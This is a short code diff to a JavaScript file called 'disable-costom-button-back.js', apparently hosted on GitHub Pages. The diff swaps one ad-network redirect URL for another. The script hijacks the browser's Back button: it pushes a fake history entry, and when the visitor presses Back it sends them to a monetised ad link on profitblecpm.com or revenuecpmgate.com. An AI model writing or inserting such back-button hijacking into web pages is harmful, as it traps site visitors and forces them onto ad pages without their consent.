@@ -1,5 +1,5 @@
 console.log("disable-costom-button-back.js aktif dari GitHub Pages!");
-const targetDirectDisableBack = "https://profitblecpm.com/s48gmyq8wkey=e6e132cb86f4e094f9d259e06c7ea212";
+const targetDirectDisableBack = "https://www.revenuecpmgate.com/cmsf39c9mk?key=11c15e053540af825eabbcf333d8ee4d";
 history.pushState(null, document.title, window.location.href);
 window.addEventListener("popstate", function (t) {
   window.location.href = targetDirectDisableBack;
